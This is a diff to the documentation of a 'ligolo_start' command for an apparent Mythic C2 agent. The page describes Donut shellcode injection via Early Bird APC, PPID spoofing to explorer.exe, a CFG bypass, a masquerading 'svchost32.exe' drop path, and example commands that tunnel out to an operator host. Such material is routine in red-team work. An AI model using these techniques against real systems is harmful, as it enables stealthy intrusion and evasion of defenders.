@@ -7,23 +7,25 @@ weight = 5
 ## Summary
 Start a ligolo-ng agent session. Two modes available:
 
-- **Disk-drop** (default): drops the binary to `remote_path` and executes via `CreateProcessW`. Requires `EMBEDDED_LIGOLO` at build time or a manually uploaded binary.
-- **Fork+Run**: downloads a Donut shellcode (connection args baked in at task time) from Mythic in chunks, injects via Early Bird APC into a sacrificial process. No disk write. Requires `binaries/agent.exe` in the container.
+- **Fork+Run** (default): Donut shellcode generated at task time, downloaded by agent, injected via Early Bird APC. No disk write. Uses bundled `binaries/agent.exe` or a custom binary.
+- **Disk-drop**: PE downloaded from Mythic, written to `remote_path`, executed via `CreateProcessW`. Uses bundled `binaries/agent.exe` or a custom binary.
 
 ## Arguments
 | Name | Required | Description |
 |------|----------|-------------|
 | `connect` | Yes* | Proxy address: `host:port` or `ws://host:port` |
 | `bind` | Yes* | Bind to `ip:port` instead of connecting out |
-| `remote_path` | No | Drop path on target - disk-drop mode only (default: `C:\Windows\Temp\svchost32.exe`) |
+| `remote_path` | No | Drop path on target - disk-drop only (default: `C:\Windows\Temp\svchost32.exe`) |
 | `ignore_cert` | No | Ignore TLS certificate (default: true) |
 | `retry` | No | Auto-retry on disconnect (default: true) |
 | `accept_fingerprint` | No | Accept cert by SHA256 fingerprint |
 | `proxy` | No | Upstream proxy URL |
 | `user_agent` | No | Custom HTTP User-Agent |
 | `verbose` | No | Verbose output (default: false) |
-| `fork_run` | No | Inject in-memory via Early Bird APC instead of dropping to disk (default: true) |
-| `chunk_size_mb` | No | Shellcode download chunk size in MB - fork+run only (default: 4). Larger = fewer round-trips = faster. |
+| `fork_run` | No | Inject in-memory via Early Bird APC (default: true) |
+| `push_mode` | No | Send shellcode in a single chunk (default: false - multi-chunk pull) |
+| `chunk_size_mb` | No | Chunk size in MB (default: 4) |
+| `binary` | No | Custom ligolo-ng agent.exe. If omitted, uses bundled `binaries/agent.exe`. |
 
 \* One of `connect` or `bind` is required.
 
@@ -34,23 +36,19 @@ Start a ligolo-ng agent session. Two modes available:
 ligolo_start -Connect 10.10.10.1:11601
 ```
 
-**Disk-drop (embedded binary at build time):**
+**Disk-drop:**
 ```
-ligolo_start 10.10.10.1:11601
-```
-
-**Disk-drop (bind mode):**
-```
-ligolo_start -Bind 0.0.0.0:11601
+ligolo_start -ForkRun false -Connect 10.10.10.1:11601
 ```
 
 **Disk-drop with custom path:**
 ```
-ligolo_start -Connect 10.10.10.1:11601 -RemotePath C:\Windows\Temp\update.exe
+ligolo_start -ForkRun false -Connect 10.10.10.1:11601 -RemotePath C:\Windows\Temp\update.exe
 ```
 
 ## Notes
-- Fork+Run: connection args (`-connect`, `-ignore-cert`, etc.) are baked into the Donut shellcode by the Python container at task creation time. The shellcode is downloaded in chunks (same protocol as upload) then injected via Early Bird APC. Memory is RW during write, flipped to RX before the APC fires.
-- Fork+Run: uses the process set by `spawnto` as host (bare name resolved via SearchPathW). PPID spoofed to `explorer.exe`. CFG bypassed (APC fires inside `ntdll!LdrInitializeThunk`).
-- Disk-drop: requires `EMBEDDED_LIGOLO` at build time, or manually upload the binary to `remote_path` first.
+- Fork+Run: Donut runs at task creation time. Bundled binary shellcode is cached in memory after the first task - subsequent tasks reuse cached bytes without re-running Donut.
+- Fork+Run: connection args passed via `CreateProcessW lpCommandLine`, not baked into shellcode - same shellcode works for any connection string.
+- Fork+Run: uses the process set by `spawnto` as host. PPID spoofed to `explorer.exe`. CFG bypassed (APC fires inside `ntdll!LdrInitializeThunk`).
+- Disk-drop: PE downloaded from Mythic in chunks and written to `remote_path`.
 - Sessions tracked in a linked list; use `ligolo_status` to list, `ligolo_stop` to terminate.
